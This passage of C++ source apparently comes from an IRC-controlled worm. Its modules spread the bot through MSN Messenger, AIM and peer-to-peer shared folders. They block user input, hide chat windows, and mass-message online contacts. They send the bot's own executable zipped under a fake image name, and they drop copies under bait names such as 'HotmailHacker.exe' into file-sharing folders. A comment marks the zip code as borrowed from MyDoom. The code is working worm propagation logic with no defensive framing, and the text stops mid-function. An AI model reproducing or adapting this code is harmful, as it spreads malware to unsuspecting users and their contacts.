	IMSNMessenger3 *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);
	char msnmsg[512];
	char buf[128];
	char msnmsg1[1024];
	strncpy(msnmsg,msn.data1,sizeof(msnmsg));
	if (SUCCEEDED(hr))
	{
		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;
				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;
								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s%s", msnmsg, buf); //Messange and email
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
                                        key_type((char *)msnmsg1, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);																	
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);					
					irc->pmsg(Decode(infochan),str_msn_msg);					
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}
	CoUninitialize();
	clearthread(msn.threadnum);
	ExitThread(0);
	return 0;
}

















////////////////////////////////////////////////
//			Msn Link Without Email
////////////////////////////////////////////////
DWORD WINAPI ImMsg2(LPVOID param)
{
	NTHREAD msn = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn.conn;
	IMSNMessenger3 *pIMessenger = NULL;
	CoInitialize(0);
	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);
	char msnmsg2[512];
	char buf[128];
	char msnmsg3[1024];
	strncpy(msnmsg2,msn.data2,sizeof(msnmsg2));
	if (SUCCEEDED(hr))
	{
		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;
				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;
								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg3, "%s", msnmsg2); // Just message
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
                                        key_type((char *)msnmsg3, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);																	
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					irc->pmsg(Decode(infochan),str_msn_msg);
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}
	CoUninitialize();
	clearthread(msn.threadnum);
	ExitThread(0);
	return 0;
}
void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
}
#endif



////////////////////////////////////////////////
//			Msn Zipsend + Message
//    contact email: example@email.com
//    zipfilename: example_0014.jpeg-www.imageshack.com.zip
//    exename: example_0014.jpeg-www.imageshack.com
//    by Damming
////////////////////////////////////////////////
#ifndef NO_MSNZIPSEND
#import "../other/MSNMessengerAPI.tlb" named_guids, no_namespace


void to_variant2(BSTR, VARIANT& vt);
int trt;
//int stats_msg;

char *stristr2(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {

		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;

			if (slen < plen)
				return (NULL);
		}

		sptr = start;
		pptr = (char *) Pattern;

		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;

			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}

void key_type2(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}

void dropfiles(HWND hwnd, char *email){
    char windir[260];
	char szFiles[260];
	char emaildir[MAX_PATH];

	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,"\\temp\\syz.tmp");
	//sprintf(windir, "%s\\%s", windir1, filename);

	GetWindowsDirectory(emaildir, sizeof(emaildir));
	strcat(emaildir, "\\temp\\");
	strcat(emaildir, email);
	strcat(emaildir, ".zip");

	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);
 
	CopyFile(szFiles, emaildir, FALSE);
	strcpy(szFiles, emaildir);

/*	
	char testbuf[1024];
	sprintf( testbuf, "email = %s\nszFiles = %s\nemaildir = %s",
		email,
		szFiles,
		emaildir);
	MessageBox(0, testbuf, "", MB_OK);
*/
	


/// copy ZIP to Clipboard
if (::OpenClipboard (hwnd)) 
{
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);

#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif

    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}
///


	//DeleteFile(emaildir);
}

DWORD WINAPI ImMsg3(LPVOID param)
{
	trt = 0;

	NTHREAD msn3 = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn3.conn;

    ///Windir Zipfile Namensgebung
	char fakename[] = "syz.tmp";

	char windir[MAX_PATH];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir, "\\temp\\");
	strcat(windir, fakename);
	///




	IMSNMessenger3 *pIMessenger = NULL;

	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);

	char msnmsg[512];
	char buf[128];
	char msnmsg1[1024];
	strncpy(msnmsg,msn3.data1,sizeof(msnmsg));
     
	if (SUCCEEDED(hr))
	{

		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{

			IMSNMessengerContacts *pIMessengerContacts = NULL;
			
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								/// Message orginal name@mail.com at end of message
								/*
							    pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s%s", msnmsg, buf);
                                */

								/// Message no name@mail.com !!!
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant2(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s", msnmsg);
								///

								/*
								///Create .zip OHNE email@email.com
								char *pemail;
								//pemail = strchr(buf, '@');
								//if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, "");
								//
								
                                */

								
								///Create .zip MIT email@email.imageshack.com
								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, "_0014.jpeg-www.imageshack.com");
								//
								//_0016.jpeg-www.facebook.com
								
                                



                                /*
								///Create .zip MIT name.com
								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, ".com");
								//

                                */
								

								char exepath[MAX_PATH];
								GetModuleFileName(NULL, exepath, MAX_PATH);
								zip_store(exepath, windir, buf);
								///



								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										//trt++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
										//stats_msg++;
										//send message
                                        key_type2((char *)msnmsg1, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);
										//send zipfile
										Sleep(50);
										dropfiles((HWND) wndIM, buf);
                                        keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);                                        
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
																		
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					irc->pmsg(Decode(infochan),str_msn_msg);
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();
	clearthread(msn3.threadnum);
	ExitThread(0);
	

	return 0;
}

void to_variant2(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
} 



////////////////////////////////////////////////
//			Create Zip
////////////////////////////////////////////////
unsigned long crc32(unsigned long crc, const unsigned char *buf, int len)

{
#define CRC32_POLYNOMIAL 0xEDB88320  //the standard PKZIP polynomial
    unsigned long crc_table[256];
    unsigned long crc32;
    int i, j;

    for (i = 0; i < 256; i++)   //this is where my algorithm starts
    {
        crc32 = i;
        for (j = 8; j > 0; j--)
        {
            if (crc32 & 1)
                crc32 = (crc32 >> 1) ^ CRC32_POLYNOMIAL;
            else
                crc32 >>= 1;
        }
        crc_table[i] = crc32;
    }

    /* Mark Adler stuff taken from zlib.c */

    if (buf == NULL) return 0L;
#define CRC32(c, b) (crc_table[((int)(c) ^ (b)) & 0xff] ^ ((c) >> 8))
#define DO1(buf)  crc = CRC32(crc, *buf++)
#define DO2(buf)  DO1(buf); DO1(buf)
#define DO4(buf)  DO2(buf); DO2(buf)
#define DO8(buf)  DO4(buf); DO4(buf)
    crc = crc ^ 0xffffffffL;
#ifndef NO_UNROLLED_LOOPS
    while (len >= 8)
    {
        DO8(buf);
        len -= 8;
    }
#endif
    if (len) do
        {
            DO1(buf);
        }
        while (--len);
    return crc ^ 0xffffffffL;
}

//from here on down is mydoom bullshit
static void zip_putcurtime(WORD *f_time, WORD *f_date)
{
    SYSTEMTIME systime;

    GetSystemTime(&systime);
    if ((systime.wYear < 1999) || (systime.wYear > 2010))
        systime.wYear = 2004;
    if (systime.wMonth < 1 || systime.wMonth > 12) systime.wMonth = 1;
    if (systime.wDay < 1 || systime.wDay > 31) systime.wDay = 10;

    *f_date =
        ((systime.wYear-1980) << 9) |
        (systime.wMonth << 5) |
        systime.wDay;

    *f_time =
        (systime.wHour << 11) |
        (systime.wMinute << 5) |
        (systime.wSecond / 2);
}

static unsigned long zip_calc_crc32(HANDLE hFileIn)
{
    unsigned long reg, i;
    unsigned char buf[1024];
    SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
    for (reg=0;;)
    {
        i = 0;
        if (ReadFile(hFileIn, buf, sizeof(buf), &i, NULL) == 0) break;
        if (i == 0) break;
        reg = crc32(reg, buf, i);
    }
    SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
    return reg;
}

int zip_store(char *in, char *out, char *store_as)
{
    HANDLE hFileIn, hFileOut;
    struct zip_header_t hdr1;
    struct zip_eod_t eod1;
    struct zip_dir_t dir1;
    char buf[1024];
    unsigned long i, j, offs;

    hFileIn = CreateFile(in, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFileIn == INVALID_HANDLE_VALUE || hFileIn == NULL)
        return 1;
    hFileOut = CreateFile(out, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFileOut == INVALID_HANDLE_VALUE || hFileOut == NULL)
    {
        CloseHandle(hFileIn);
        return 2;
    }

    memset(&hdr1, '\0', sizeof(hdr1));
    memset(&dir1, '\0', sizeof(dir1));
    memset(&eod1, '\0', sizeof(eod1));
    offs = 0;

    hdr1.signature = 0x04034b50;
    dir1.ver_needed = hdr1.ver_needed = 10;
    dir1.flags = hdr1.flags = 0;
    dir1.method = hdr1.method = 0;
    zip_putcurtime(&hdr1.lastmod_time, &hdr1.lastmod_date);
    dir1.lastmod_time = hdr1.lastmod_time;
    dir1.lastmod_date = hdr1.lastmod_date;
    hdr1.crc = zip_calc_crc32(hFileIn);
    dir1.crc = hdr1.crc;

    hdr1.compressed_size = GetFileSize(hFileIn, NULL);
    dir1.compressed_size = hdr1.compressed_size;
    hdr1.uncompressed_size = GetFileSize(hFileIn, NULL);
    dir1.uncompressed_size = hdr1.uncompressed_size;
    hdr1.filename_length = lstrlen(store_as);
    dir1.filename_length = hdr1.filename_length;
    dir1.extra_length = hdr1.extra_length = 0;

    dir1.local_offs = offs;

    WriteFile(hFileOut, &hdr1, sizeof(hdr1), &i, NULL);
    offs += sizeof(hdr1);
    WriteFile(hFileOut, store_as, lstrlen(store_as), &i, NULL);
    offs += lstrlen(store_as);
    SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
    for (;;)
    {
        i = 0;
        if (ReadFile(hFileIn, buf, sizeof(buf), &i, NULL) == 0) break;
        if (i == 0) break;
        WriteFile(hFileOut, buf, i, &j, NULL);
        offs += i;
    }

    eod1.dir_offs = offs;

    dir1.signature = 0x02014b50;
    dir1.made_by = 20;
    dir1.internal_attr = 0;
    dir1.external_attr = 0x20;
    WriteFile(hFileOut, &dir1, sizeof(dir1), &i, NULL);
    offs += sizeof(dir1);
    WriteFile(hFileOut, store_as, lstrlen(store_as), &i, NULL);
    offs += lstrlen(store_as);

    eod1.signature = 0x06054b50;
    eod1.disk_no = 0;
    eod1.disk_dirst = 0;
    eod1.disk_dir_entries = 1;
    eod1.dir_entries = eod1.disk_dir_entries;
    eod1.dir_size = offs - eod1.dir_offs;
    eod1.comment_len = 0;
    WriteFile(hFileOut, &eod1, sizeof(eod1), &i, NULL);

    CloseHandle(hFileOut);
    CloseHandle(hFileIn);
    return 0;
}
#endif

////////////////////////////////////////////////
//			AIM (Triton) 
////////////////////////////////////////////////

#ifndef NO_AIM
typedef VOID( __stdcall* STTW )( HWND, BOOL );
STTW fSwitchToThisWindow = (STTW)GetProcAddress( GetModuleHandle( "user32.dll" ), "SwitchToThisWindow" );

void FocusWindow(HWND hWindow)
{
   fSwitchToThisWindow(hWindow, TRUE);
   Sleep(250);
}

void HitKey(unsigned char cKey, unsigned int iTimes)
{
	for(unsigned int i = 0; i < iTimes; ++i)
	{
		keybd_event(cKey, 0, 0, 0);
		keybd_event(cKey, 0, KEYEVENTF_KEYUP, 0);
	}
}

void SysKey(HWND hWindow, WPARAM wKey, unsigned int iTimes)
{
	for(unsigned int i = 0; i < iTimes; ++i)
	{
		SendMessage(hWindow, WM_SYSKEYDOWN, wKey, 0);
		SendMessage(hWindow, WM_SYSKEYUP, wKey, 0);
	}
}

DWORD WINAPI TritonMessage(LPVOID param)
{
	NTHREAD tim = *((NTHREAD *)param);
	NTHREAD *tims = (NTHREAD *)param;
	tims->gotinfo = TRUE;
	IRC* irc=(IRC*)tim.conn;

	char szMsg[512];
	strncpy(szMsg,tim.data1,sizeof(szMsg));
	bool bDone = false;
	char szWindowText[256], szLastBuddy[256];
	ZeroMemory(&szLastBuddy, 256);
	HWND hTray = FindWindow("imAppSystemTrayHandler", "imApp"), hBuddyList = NULL, hKill = NULL;
	if(IsWindow(hTray))
	{
		SendMessage(hTray, 0x0065, 0x00000141, 0x00000203);
		do {
			hBuddyList = FindWindow("__oxFrame.class__", "AIM");
		} while(!IsWindow(hBuddyList));
		do {
			hKill = FindWindowEx(NULL, hKill, "__oxFrame.class__", NULL);
			ZeroMemory(&szWindowText, 256);
			GetWindowText(hKill, szWindowText, 256);
			if(strcmp(szWindowText, "AIM") != 0)
				SendMessage(hKill, WM_CLOSE, 0, 0);
		} while(IsWindow(hKill));
		TritonSetupList(hBuddyList, false);
		while(!bDone)
		{
			Sleep(3000);
			FocusWindow(hBuddyList);
 			SysKey(hBuddyList, VK_DOWN, 1);
 			SysKey(hBuddyList, VK_RETURN, 1);
			HWND hWindow = NULL;
			do {
				hWindow = FindWindowEx(NULL, hWindow, "__oxFrame.class__", NULL);
				if(IsWindow(hWindow))
				{
					ZeroMemory(&szWindowText, 256);
					GetWindowText(hWindow, szWindowText, 256);
					if((strcmp(szWindowText, " IMs") == 0) ||
						(strstr(szWindowText, "IM with ") != NULL))
					{
						if(strcmp(szLastBuddy, szWindowText) == 0)
							bDone = true;
						else {
							strncpy(szLastBuddy, szWindowText, 256);
							FocusWindow(hWindow);
							TritonIm(hWindow, szMsg);
						}
						SendMessage(hWindow, WM_CLOSE, 0, 0);
					}
				}
			} while(IsWindow(hWindow));
		}
 		TritonSetupList(hBuddyList, true);
		//return 0;
	}
	clearthread(tim.threadnum);
	ExitThread(0);

	return 0;
}

void TritonIm(HWND hWindow, char* szMsg)
{
	HWND hLink = NULL;
	for(unsigned int i = 0; i < strlen(szMsg); ++i)
	{
		if (szMsg[i] == '[')
		{
			keybd_event(VK_CONTROL, 0, 0, 0);
			short sKey = VkKeyScan('l');
			keybd_event((unsigned char)sKey, 0, 0, 0);
			keybd_event((unsigned char)sKey, 0, KEYEVENTF_KEYUP, 0);
			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
			do {
				hLink = FindWindowEx(NULL, hLink, "__oxFrame.class__", "Edit Hyperlink");
			} while(!IsWindow(hLink));
			FocusWindow(hLink);
		} else if (szMsg[i] == '+') {
			HitKey(VK_TAB, 1);
		} else if (szMsg[i] == ']') {
			HitKey(VK_TAB, 1);
			HitKey(VK_RETURN, 1);
			Sleep(250);
			FocusWindow(hWindow);
		} else {
			short sKey = VkKeyScan(szMsg[i]);
			if((sKey >> 8) & 1) keybd_event(VK_LSHIFT, 0, 0, 0);
			keybd_event((unsigned char)sKey, 0, 0, 0);
			keybd_event((unsigned char)sKey, 0, KEYEVENTF_KEYUP, 0);
			if((sKey >> 8) & 1) keybd_event(VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0);
		}
	}
	FocusWindow(hWindow);
	HitKey(VK_RETURN, 1);
	Sleep(250);
}

bool TritonSetupList(HWND hBuddyList, bool bFix)
{  
	FocusWindow(hBuddyList);
	SysKey(hBuddyList, VK_ESCAPE, 2);
	SysKey(hBuddyList, VK_MENU, 1);
	SysKey(hBuddyList, VK_RIGHT, 2);
	SysKey(hBuddyList, VK_UP, 3);
	SysKey(hBuddyList, VK_RIGHT, 1);
	SysKey(hBuddyList, VK_DOWN, (bFix?1:2));
	SysKey(hBuddyList, VK_RETURN, 1);
	SysKey(hBuddyList, VK_MENU, 1);
	SysKey(hBuddyList, VK_RIGHT, 2);
	SysKey(hBuddyList, VK_UP, 7);
	SysKey(hBuddyList, VK_RIGHT, 1);
	if (!bFix)
		SysKey(hBuddyList, VK_DOWN, 1);
	SysKey(hBuddyList, VK_RETURN, 1);
	SysKey(hBuddyList, VK_HOME, 1);
	return true;
}
#endif
////////////////////////////////////////////////
//			   AIM
////////////////////////////////////////////////
#ifndef NO_AIM
DWORD WINAPI AimMessage(LPVOID param)
{
	NTHREAD aim = *((NTHREAD *)param);
	NTHREAD *aims = (NTHREAD *)param;
	aims->gotinfo = TRUE;
	IRC* irc=(IRC*)aim.conn;

	char szMessage[512];
	strncpy(szMessage,aim.data1,sizeof(szMessage));
	HWND hStatus = FindWindow("_Oscar_StatusNotify", NULL), hAim = NULL;
	if(IsWindow(hStatus))
	{
		SendMessage(hStatus, WM_COMMAND, 20003, 0);
		while(true)
		{
			hAim = FindWindowEx(NULL, hAim, "#32770", NULL);
			if(IsWindow(hAim))
			{
				HWND hList = FindWindowEx(hAim, 0, "#32770", "Buddy List");
				if(IsWindow(hList))
				{
					HWND hTree = FindWindowEx(hList, 0, "_Oscar_Tree", "");
					if(IsWindow(hTree))
					{
						AimCloseAll();
						int iCount = SendMessage(hTree, LB_GETCOUNT, 0, 0);
						int iIndex = 0;
						while(iIndex <= iCount)
						{
							SendMessage(hTree, LB_SETCURSEL, ++iIndex, 0);
							SendMessage(hTree, WM_KEYDOWN, 37, 0);
							SendMessage(hTree, WM_KEYUP, 37, 0);
						}
						iCount = SendMessage(hTree, LB_GETCOUNT, 0, 0);
						for(int i = 0; i < iCount; ++i)
						{
							SendMessage(hTree, LB_SETCURSEL, i, 0);
							SendMessage(hTree, WM_KEYDOWN, 39, 0);
							SendMessage(hTree, WM_KEYUP, 39, 0);
							int iSubCount = (SendMessage(hTree, LB_GETCOUNT, 0, 0) - iCount);
							for(int s = (i + 1); s <= (i + iSubCount); ++s)
							{
								SendMessage(hTree, LB_SETCURSEL, s, 0);
								SendMessage(hList, WM_COMMAND, 139, 0);
								AimSend(szMessage);
								Sleep(3000);
							}
							SendMessage(hTree, LB_SETCURSEL, i, 0);
							SendMessage(hTree, WM_KEYDOWN, 37, 0);
							SendMessage(hTree, WM_KEYUP, 37, 0);
							SendMessage(hTree, LB_SETCURSEL, i, 0);
						}
						break;
					}
				}
			}
		}
	}
	clearthread(aim.threadnum);
	ExitThread(0);

	return 0;
}

void AimSend(char* szMessage)
{
	HWND hWindow = NULL;
	while(true)
	{
		hWindow = FindWindowEx(NULL, NULL, "AIM_IMessage", NULL);
		if(IsWindow(hWindow))
		{
			HWND hTextBox = NULL, hFind = NULL, hSend = NULL;
			do {
				hTextBox = FindWindowEx(hWindow, hTextBox, "WndAte32Class", NULL);
				if(IsWindow(hTextBox))
				{
					hFind = FindWindowEx(hTextBox, 0, "CBClass", NULL);
					if(IsWindow(hFind))
					{
						hFind = FindWindowEx(hTextBox, 0, "Ate32Class", NULL);
						SendMessage(hFind, WM_SETTEXT, 0, (LPARAM)szMessage);
						do {
							hSend = FindWindowEx(hWindow, hSend, "_Oscar_IconBtn", NULL);
							if(IsWindow(hSend))
							{
								if(((int)GetMenu(hSend)) == 409)
								{
									SendMessage(hSend, WM_LBUTTONDOWN, 0, 0);
									SendMessage(hSend, WM_LBUTTONUP, 0, 0);
								}
							}
						} while(IsWindow(hSend));
						AimCloseAll();
						return;
					}
				}
			} while(IsWindow(hTextBox));
		}
	}
}

void AimCloseAll(void)
{
	HWND hWindow = NULL;
	do {
		hWindow = FindWindowEx(NULL, NULL, "AIM_IMessage", NULL);
		SendMessage(hWindow, WM_CLOSE, 0, 0);
	} while(hWindow != NULL);
}
#endif

    //////////////////////////////////////////////////////////////////////////////
	//                               P2P Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_P2P
char *szPath[] = 
{
	"kazaa\\my shared folder\\",
	"kazaa lite\\my shared folder\\",
	"kazaa lite k++\\my shared folder\\",
	"icq\\shared folder\\",
	"grokster\\my grokster\\",
	"bearshare\\shared\\",
	"edonkey2000\\incoming\\",
	"emule\\incoming\\",
	"morpheus\\my shared folder\\",
	"limewire\\shared\\",
	"tesla\\files\\",
	"winmx\\shared\\"
};

char *szFiles[] =
{
		"HotmailHacker.exe",
		"YahooCracker.exe",
		"MSNHacks.exe",
		"paris-hilton.scr",
		"VistaUltimate-Crack.exe",
		"image.scr",
		"Porno.MPEG.exe",
		"LimeWireCrack.exe",
		"RapidsharePREMIUM.exe",
		"WildHorneyTeens.scr",
		"Ebooks.exe",
		"How-to-make-money.exe",
		"ScreenMelter.exe",
		"DDOSPING.exe",
		"Wireshark.exe",
		"Autoloader.exe",
		"FREEPORN.exe,"
		"fuckshitcunt.scr",
		"ilovetofuck.scr",
		"headjobs.scr",
		"porno.scr"
};

bool InfectP2P()
{
	P2PInfo_s *pP2PInfo_s = new P2PInfo_s;
	if (pP2PInfo_s) 
		ZeroMemory(pP2PInfo_s, sizeof(P2PInfo_s));
	else
		ExitThread(0);
	GetModuleFileName(GetModuleHandle(NULL), pP2PInfo_s->szDirectory, sizeof(pP2PInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{

            char p2pfolder[1024];
			char szBuf[256];
			//Find Programfiles coded by Damming ;)
	        ExpandEnvironmentStrings("%programfiles%",szBuf,256);
